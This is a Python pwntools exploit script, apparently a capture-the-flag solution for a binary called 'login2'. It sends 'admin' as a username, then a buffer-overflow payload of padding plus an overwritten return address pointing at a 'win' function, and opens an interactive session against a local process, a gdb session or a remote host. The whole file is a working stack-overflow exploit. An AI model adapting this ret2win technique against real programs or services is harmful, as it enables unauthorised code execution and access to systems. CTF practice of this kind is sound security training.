#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./login2"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b main
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


win_addr = 0x401346

payload = b"A" * 0x40
payload += b"B" * 0x8# save rbp
payload += p64(win_addr)

p.recvuntil(":")
p.sendline("admin")
p.recvuntil(":")
p.sendline(payload)

p.interactive()
